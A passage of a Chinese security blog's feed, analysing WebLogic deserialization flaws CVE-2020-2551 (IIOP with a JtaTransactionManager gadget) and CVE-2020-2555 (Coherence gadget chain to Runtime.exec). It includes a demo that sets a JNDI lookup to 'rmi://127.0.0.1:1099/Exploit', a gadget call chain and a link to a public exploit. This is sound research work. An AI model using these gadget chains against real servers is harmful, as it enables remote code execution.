class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.rmi.PortableRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloImpl</span> <span class="keyword">extends</span> <span class="title">PortableRemoteObject</span> <span class="keyword">implements</span> <span class="title">HelloInterface</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HelloImpl</span><span class="params">()</span> <span class="keyword">throws</span> java.rmi.RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();     <span class="comment">// invoke rmi linking and remote object initialization</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sayHello</span><span class="params">( String from )</span> <span class="keyword">throws</span> java.rmi.RemoteException </span>&#123;</span><br><span class="line">        System.out.println( <span class="string">"Hello from "</span> + from + <span class="string">"!!"</span> );</span><br><span class="line">        System.out.flush();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>编写服务端，创建servant实例，绑定对象。<br>HelloServer.java<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloServer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> String JNDI_FACTORY = <span class="string">"com.sun.jndi.cosnaming.CNCtxFactory"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//实例化Hello servant</span></span><br><span class="line">            HelloImpl helloRef = <span class="keyword">new</span> HelloImpl();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//使用JNDI在命名服务中发布引用</span></span><br><span class="line">            InitialContext initialContext = getInitialContext(<span class="string">"iiop://127.0.0.1:1050"</span>);</span><br><span class="line">            initialContext.rebind(<span class="string">"HelloService"</span>, helloRef);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">"Hello Server Ready..."</span>);</span><br><span class="line"></span><br><span class="line">            Thread.currentThread().join();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">            ex.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> InitialContext <span class="title">getInitialContext</span><span class="params">(String url)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        Hashtable env = <span class="keyword">new</span> Hashtable();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);</span><br><span class="line">        env.put(Context.PROVIDER_URL, url);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> InitialContext(env);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>编写客户端类，远程调用<code>sayHello()</code>方法。<br>HelloClient.java<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.rmi.PortableRemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span>  <span class="title">main</span><span class="params">( String args[] )</span> </span>&#123;</span><br><span class="line">        Context ic;</span><br><span class="line">        Object objref;</span><br><span class="line">        HelloInterface hi;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            Hashtable env = <span class="keyword">new</span> Hashtable();</span><br><span class="line">            env.put(<span class="string">"java.naming.factory.initial"</span>, <span class="string">"com.sun.jndi.cosnaming.CNCtxFactory"</span>);</span><br><span class="line">            env.put(<span class="string">"java.naming.provider.url"</span>, <span class="string">"iiop://127.0.0.1:1050"</span>);</span><br><span class="line"></span><br><span class="line">            ic = <span class="keyword">new</span> InitialContext(env);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// STEP 1: Get the Object reference from the Name Service</span></span><br><span class="line">            <span class="comment">// using JNDI call.</span></span><br><span class="line">            objref = ic.lookup(<span class="string">"HelloService"</span>);</span><br><span class="line">            System.out.println(<span class="string">"Client: Obtained a ref. to Hello server."</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// STEP 2: Narrow the object reference to the concrete type and</span></span><br><span class="line">            <span class="comment">// invoke the method.</span></span><br><span class="line">            hi = (HelloInterface) PortableRemoteObject.narrow(</span><br><span class="line">                    objref, HelloInterface.class);</span><br><span class="line">            hi.sayHello( <span class="string">" MARS "</span> );</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span>( Exception e ) &#123;</span><br><span class="line">            System.err.println( <span class="string">"Exception "</span> + e + <span class="string">"Caught"</span> );</span><br><span class="line">            e.printStackTrace( );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>编译</strong><br>编译远程接口实现类:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac -d . -classpath . HelloImpl.java</span><br></pre></td></tr></table></figure></p><p>给实现类创建stub和skeleton(简单理解即jvm中的套接字通信程序)：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rmic -iiop HelloImpl</span><br></pre></td></tr></table></figure></p><p>执行完后会创建两个文件：</p><ul><li>_HelloInterface_Stub.class： 客户端的stub</li><li>_HelloImpl_Tie.class：服务端的skeleton<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632041.jpg" alt="-w377"></li></ul><p>编译：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac -d . -classpath . HelloInterface.java HelloServer.java HelloClient.java</span><br></pre></td></tr></table></figure></p><p><strong>运行</strong><br>开启Naming Service：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">orbd -ORBInitialPort 1050 -ORBInitialHost 127.0.0.1</span><br></pre></td></tr></table></figure></p><p>运行客户端服务端：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -classpath .  HelloServer</span><br><span class="line">java -classpath .  HelloClient</span><br></pre></td></tr></table></figure></p><blockquote><p>上述客户端服务端代码如果在<code>InitialContext</code>没传入参数可以像文档中所述通过<code>java -D</code>传递<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632048.jpg" alt="-w756"></p></blockquote><p><strong>结果</strong><br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632055.jpg" alt="-w820"></p><p><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632063.jpg" alt="-w887"></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>weblogic10.3.6版本，jdk8u73版本</p><blockquote><p>采坑，记得weblogic版本、rmi服务、exp版本都一致</p></blockquote><p>EXP：<a href="https://github.com/Y4er/CVE-2020-2551" target="_blank" rel="noopener">https://github.com/Y4er/CVE-2020-2551</a><br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632075.jpg" alt="-w1592"></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>这个该漏洞借助IIOP协议触发反序列化，结合对<code>JtaTransactionManager</code>类的错误过滤，导致可以结合其触发其类的JNDI注入造成RCE的效果。</p><h2 id="JtaTransactionManager-Gadget分析"><a href="#JtaTransactionManager-Gadget分析" class="headerlink" title="JtaTransactionManager Gadget分析"></a>JtaTransactionManager Gadget分析</h2><p>weblogic中自带的一个Spring框架的包：<code>/com/bea/core/repackaged/springframework/transaction/jta/JtaTransactionManager#readObject</code><br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632083.jpg" alt="-w1177"><br>在反序列化调用<code>readObject</code>时，会调用<code>initUserTransactionAndTransactionManager</code>方法：<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632091.jpg" alt="-w1181"><br>接着调用<code>this.lookupUserTransaction</code>方法，传入成员变量<code>this.userTransactionName</code>:<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632100.jpg" alt="-w1320"></p><p>获取<code>this.getJndiTemplate()</code>后，在<code>/com/bea/core/repackaged/springframework/jndi/JndiTemplate#lookup</code>中<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632108.jpg" alt="-w1285"><br>到这里通过控制<code>userTransactionName</code>属性，进行JNDI注入：<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632117.jpg" alt="-w1428"></p><p>demo:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jnditest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        JtaTransactionManager jtaTransactionManager = <span class="keyword">new</span> JtaTransactionManager();</span><br><span class="line">        jtaTransactionManager.setUserTransactionName(<span class="string">"rmi://127.0.0.1:1099/Exploit"</span>);</span><br><span class="line">        serialize(jtaTransactionManager);</span><br><span class="line">        deserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"jndi.ser"</span>));</span><br><span class="line">            os.writeObject(obj);</span><br><span class="line">            os.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">deserialize</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectInputStream is = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"jndi.ser"</span>));</span><br><span class="line">            is.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632127.jpg" alt="-w1294"></p><p>后来翻了一下资料，在<a href="https://paper.seebug.org/718/" target="_blank" rel="noopener">CVE-2018-3191</a>中使用的就是该gadget，当时结合T3协议进行反序列化，修复方案将<code>JtaTransactionManager</code>的父类<code>AbstractPlatformTransactionManager</code>加入到黑名单列表了，T3协议使用的是<code>resolveClass</code>方法去过滤的,<code>resolveClass</code>方法是会读取父类的,所以T3协议这样过滤是没问题的。但是在IIOP协议这里，也是使用黑名单进行过滤，但不是使用<code>resolveClass</code>方法去判断的，这样默认只会判断本类的类名，而JtaTransactionManager类是不在黑名单列表里面的,它的父类才在黑名单列表里面,这样就可以反序列化JtaTransactionManager类了，从而触发JNDI注入。</p><h2 id="Context的生成以及bind的流程-servant-side"><a href="#Context的生成以及bind的流程-servant-side" class="headerlink" title="Context的生成以及bind的流程(servant side)"></a>Context的生成以及bind的流程(servant side)</h2><p>在上文中RMI-IIOP的客户端demo中，分为三个步骤：</p><ul><li>从Name Service中获取Conetext对象</li><li>从Name Service中查询指定名称所对应的引用</li><li>调用远程方法<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632141.jpg" alt="-w1081"></li></ul><p>先来看第一个过程，无论是客户端还是服务端都要进行的的一个步骤：<code>InitialContext</code>方法中将<code>env</code>参数传入，进行初始化：<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632149.jpg" alt="-w759"><br>经过几次调用，一直跟进到<code>javax/naming/spi/NamingManager.java#getInitialContext</code>方法<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632159.jpg" alt="-w778"><br>可以看到在这里将我们传入的<code>env</code>对应的工厂类进行获取，我们来找一下，在weblogic中有多少个可以加载的工厂类，找到<code>InitialContextFactory</code>接口(<code>ctrl+h</code>查看依赖树)<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632168.jpg" alt="-w793"></p><p>这里直接来看<code>WLInitialContextFactory</code>类：<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632175.jpg" alt="-w954"></p><p><code>/wlserver_10.3/server/lib/wls-api.jar!/weblogic/jndi/Environment#getContext</code><br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632185.jpg" alt="-w1445"></p><p><code>getInitialContext</code>方法中，到这里其实就是CORBA的解析流程了，<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632195.jpg" alt="-w1050"></p><p>简单跟一下<code>string_to_object</code>方法，这里其实就是上文中CORBA的stub生成三种方式所对应的协议：</p><ul><li>IOR</li><li>Corbaname</li><li>Corbaloc<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632209.jpg" alt="-w1262"></li></ul><p>再来看<code>getORBReference</code>方法，其实就是CORBA初始化orb获取<code>Name Service</code>的过程：<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632218.jpg" alt="-w1246"><br>对应CORBA中代码：<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632226.jpg" alt="-w1001"><br>再来看一下<code>Conetext</code>的绑定过程：<code>/corba/j2ee/naming/ContextImpl</code><br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632236.jpg" alt="-w1065"><br>可以看到这个过程其实就是CORBA生成IOR的过程，指定java类型交互的约定为<code>tk_value</code>，设定op为<code>rebind_any</code>，存储序列化数据到any类，待client side调用。</p><blockquote><p>其实在分析这里之前一直有一个问题无法理解，一直以为weblogic是orbd+servant side，而我们写的exp是client side，在和@Lucifaer师傅学习后，其实对于weblogic的orbd而言，servant side和client side都是客户端，而weblogic(orbd)是在处理servant side的时候解析数据造成反序列化的问题。</p></blockquote><p>到这里servant side的注册就结束了，下面来分析一下weblogic是如何对其进行解析的。</p><h2 id="weblogic解析流程"><a href="#weblogic解析流程" class="headerlink" title="weblogic解析流程"></a>weblogic解析流程</h2><p>weblogic解析请求的入口开始：weblogic/rmi/internal/wls/WLSExecuteRequest#run<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632243.jpg" alt="-w895"><br>完整调用栈在下文，这里选取几个比较关键的点来分析：<code>weblogic/corba/idl/CorbaServerRef#invoke</code><br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632254.jpg" alt="-w1400"><br>先是判断请求类型是否为<code>objectMethods</code>已经存在的，这里是<code>rebind_any</code>，不存在则调用<code>this.delegate._invoke</code>方法，然后将方法类型，<code>IIOPInputStream</code>数据传入<code>_invoke</code>函数：<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632264.jpg" alt="-w639"><br><code>rebind_any</code>指令类型对应的<code>var5</code>为1，进入<code>var2.read_any()</code><br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632272.jpg" alt="-w687"><br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632280.jpg" alt="-w1221"><br>这里的<code>this.read_TypeCode()</code>即上文中Context bind中的<code>tk_value</code>设置的交互类型，在<code>weblogic/corba/idl/AnyImpl#read_value_internal</code>对应<code>case 30</code>，同时这里的<code>Any</code>类型，在上文<code>Context</code>分析中正式我们将序列化数据插入的地方。<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632287.jpg" alt="-w1052"><br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632294.jpg" alt="-w1449"></p><p>跟进<code>weblogic/corba/utils/ValueHandlerImpl</code><br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632305.jpg" alt="-w1500"></p><p>在这里var2为<code>ObjectStreamClass</code>，调用其readObject方法。继续跟<code>readObject</code>：<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632315.jpg" alt="-w1496"><br>反射调用<code>JtaTransactionManager</code>的<code>readObject</code>：<code>com/bea/core/repackaged/springframework/transaction/jta/JtaTransactionManager#readObject</code><br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632324.jpg" alt="-w1437"><br>最后就是jndi注入了：<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632331.jpg" alt="-w1464"></p><p>完整调用栈：<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632342.jpg" alt="-w820"></p><h1 id="EXP分析"><a href="#EXP分析" class="headerlink" title="EXP分析"></a>EXP分析</h1><p>在分析EXP时个人有一点疑惑，记录一下分析和解决的过程。</p><p>参考<a href="https://github.com/Y4er/CVE-2020-2551" target="_blank" rel="noopener">Y4er/CVE-2020-2551</a>，这里我们结合IIOP servant side的demo来看：<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632353.jpg" alt="-w824"><br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632362.jpg" alt="-w1144"></p><p>上图为EXP，下图为IIOP服务端，这里有一点需要注意的是，在demo中<code>HelloImpl</code>类继承了<code>HelloInterface</code>实现了<code>java.rmi.Remote</code>远程类的继承：<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632369.jpg" alt="-w861"></p><p>回过头来看<code>JtaTransactionManager</code>类的接口：<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632379.jpg" alt="-w1492"><br>正是这个原因才需要我们在编写EXP的时候，需要将<code>jtaTransactionManager</code>通过反射，动态转换成remote达到远程调用的目的。</p><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>在自己动手分析之前，我一直把weblogic当成servant side和orbd(name Service)，也无法理解为什么EXP要和COBAR的servant side一样用rebind注册，后来在@Lucifaer师傅的帮助下才理解这里没有client side的参与，而对于Name Service而言这两者都是客户端。</p><p>其次这种漏洞IIOP只是载体，<code>JtaTransactionManager</code>为gadget，官方修复也仅仅只是添加黑名单，IIOP的问题没根本解决，再爆一个gadget又得修，问题源源不断。更坑爹的是官网直接下的weblogic连黑名单都没有，个人觉得防御这种问题单纯靠waf流量检测根本防不住，没有反序列化特征，二进制数据流。要防范这类新问题的产生，或许只有RASP的行为检测才能解决。</p><p>最后感谢@Lucifaer师傅的帮助~</p><p>参考文章：</p><ul><li><a href="https://paper.seebug.org/1105/" target="_blank" rel="noopener">关于 Java 中的 RMI-IIOP</a></li><li><a href="https://docs.oracle.com/javase/8/docs/technotes/guides/rmi-iiop/tutorial.html#7738" target="_blank" rel="noopener">Tutorial: Getting Started Using RMI-IIOP</a></li><li><a href="https://weinan.io/2017/05/03/corba-iiop.html" target="_blank" rel="noopener">An Introduction To The CORBA And Java RMI-IIOP</a></li><li><a href="https://docs.oracle.com/javase/8/docs/technotes/guides/idl/mapping/jidlMapping.html" target="_blank" rel="noopener">Java IDL: IDL to Java Language Mapping</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Web" scheme="http://0day.design/categories/Web/"/>
    
    
      <category term="Java" scheme="http://0day.design/tags/Java/"/>
    
      <category term="漏洞分析" scheme="http://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-2555：weblogic反序列化漏洞分析</title>
    <link href="http://0day.design/2020/03/11/CVE-2020-2555%EF%BC%9Aweblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://0day.design/2020/03/11/CVE-2020-2555：weblogic反序列化漏洞分析/</id>
    <published>2020-03-11T07:14:00.000Z</published>
    <updated>2020-03-11T07:52:45.779Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>2020年3月6日，Oracle Coherence 反序列化远程代码执行漏洞（CVE-2020-2555）的细节被公开，Oracle Coherence为Oracle融合中间件中的产品，在WebLogic 12c及以上版本中默认集成到WebLogic安装包中，攻击者通过t3协议发送构造的序列化数据，能过造成命令执行的效果。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>参考官方发的补丁公告：<a href="https://www.oracle.com/security-alerts/cpujan2020.html" target="_blank" rel="noopener">Oracle Critical Patch Update Advisory - January 2020 Description</a></p><p><img src="https://i.loli.net/2020/03/11/bK9exzZptvAXPaH.jpg" alt="-w1191"></p><p><img src="https://i.loli.net/2020/03/11/Ns9ezxojvMkXgwK.jpg" alt="-w1456"></p><p>这里我们用12.2.1.4测试，拉到idea中，动态调试环境参考：<a href="https://0day.design/2020/02/11/WebLogic-XMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/#more">WebLogic-XMLDecoder反序列化分析</a></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>主要参考这篇文章来构建gadgets，<a href="https://www.thezdi.com/blog/2020/3/5/cve-2020-2555-rce-through-a-deserialization-bug-in-oracles-weblogic-server" target="_blank" rel="noopener">CVE-2020-2555: RCE THROUGH A DESERIALIZATION BUG IN ORACLE’S WEBLOGIC SERVER</a></p><p>根据文章所述的source点，<code>cmd + o</code>快速定位到<br><code>/coherence_3.7/lib/coherence.jar!/com/tangosol/util/filter/LimitFilter.class</code><br><img src="https://i.loli.net/2020/03/11/8cRisKOtx3MCTrN.jpg" alt="-w1235"><br>文章中diff的函数就是这个<code>toString</code>函数了，补丁中去掉了该函数所有的<code>extractor.extract</code>方法：<br><img src="https://i.loli.net/2020/03/11/uw6ejRYr13cBTEn.jpg" alt="-w1473"></p><p><code>toString()</code>方法，在很多JRE的class中<code>readObject</code>方法都有实现，比如：javax/management/BadAttributeValueExpException.java<br><img src="https://i.loli.net/2020/03/11/3sCOfKcbw8XA5rJ.jpg" alt="-w1065"></p><blockquote><p>这个点和common-collection5的gadget很像，参考文章：<a href="https://y4er.com/post/ysoserial-commonscollections-5/" target="_blank" rel="noopener">https://y4er.com/post/ysoserial-commonscollections-5/</a></p></blockquote><p>接着就是寻找哪个可序列化class中的有<code>extract</code>函数，且方便构造命令执行的，一般来说有这么些点：</p><ul><li><code>Runtime.exec()</code></li><li><code>Method.invoke()</code></li><li><code>RMI/JNDI/JRMP</code></li></ul><p>在<code>com/tangosol/util/extractor/ReflectionExtractor.class</code>中实现了<code>Method.invoke()</code>的调用：<br><img src="https://i.loli.net/2020/03/11/inmPW7RUv2XJ9By.jpg" alt="-w1445"></p><p>这里读过<code>common-collection5</code>的都会熟悉，接下来就要找一个链式调用的点，构造命令执行: <code>/com/tangosol/util/extractor/ChainedExtractor.class</code><br><img src="https://i.loli.net/2020/03/11/DZlf9nWMwcp2aOJ.jpg" alt="-w1052"></p><h2 id="编写EXP"><a href="#编写EXP" class="headerlink" title="编写EXP"></a>编写EXP</h2><p>到这里基本已经分析完了，EXP编写参考这个完成gadget调用链：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">   BadAttributeValueExpException.readObject()</span><br><span class="line">       LimitFilter.toString()</span><br><span class="line">           ChainedExtractor.extract()</span><br><span class="line">                   ReflectionExtractor.extract()</span><br><span class="line">                       Method.invoke()</span><br><span class="line">                           Class.getMethod()</span><br><span class="line">                   ReflectionExtractor.extract()</span><br><span class="line">                       Method.invoke()</span><br><span class="line">                           Runtime.getRuntime()</span><br><span class="line">                   ReflectionExtractor.extract()</span><br><span class="line">                       Method.invoke()</span><br><span class="line">                           Runtime.exec()</span><br></pre></td></tr></table></figure></p><p>这个漏洞基本思路和common-collection一样，编写EXP只有一点点差异，仔细读代码理解调用关系就好了，这里就不公开EXP了。<br><img src="https://i.loli.net/2020/03/11/aAJgSNu3iyDqbvc.jpg" alt="-w1648"></p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>因为是参考分析写的EXP，分析文章中关键类的位置已经给出了，个人感觉挖掘漏洞过程中最重要的点还是寻找数据传输的过程，之后的学习得在寻找gadget调用关系上多研究研究。</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Web" scheme="http://0day.design/categories/Web/"/>
    
    
      <category term="Java" scheme="http://0day.design/tags/Java/"/>
    
      <category term="漏洞分析" scheme="http://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Shiro 反序列化漏洞分析</title>
    <link href="http://0day.design/2020/03/08/Shiro%20Padding%20Oracle%20Attack%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://0day.design/2020/03/08/Shiro Padding Oracle Attack 反序列化/</id>
    <published>2020-03-08T11:02:00.000Z</published>
    <updated>2020-03-09T08:49:28.166Z</updated>
    
